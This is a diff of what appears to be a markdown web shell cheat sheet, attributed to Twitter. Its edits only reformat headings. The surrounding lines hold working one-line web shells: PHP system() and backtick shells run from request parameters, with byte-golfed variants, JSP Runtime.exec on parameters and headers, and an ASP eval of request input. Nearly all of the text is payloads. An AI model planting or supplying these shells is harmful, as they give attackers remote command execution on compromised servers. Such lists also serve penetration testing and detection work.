@@ -2,7 +2,7 @@
 
 ### Source: Twitter
 
-#PHP
+# PHP
 
 ```
 <?php system($_REQUEST["cmd"]); ?>
@@ -57,14 +57,14 @@ And then after visiting the URL http://138.68.228.12/alien_message/super_secret_
 <?=`{$_GET[_]}`; (16 bytes) PHP shell is not the shortest. Can do without {} The shortest is <?=`$_GET[_]`; (14 bytes) if short_open_tag: Off and <?`$_GET[_]`; (13 bytes) if short_open_tag: On
 ```
 
-#JSP
+# JSP
 
 ```
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 <%Runtime.getRuntime().exec(request.getHeader("c"));%>
 ```
 
-#ASP
+# ASP
 
 ```
 <% eval request("cmd") %>
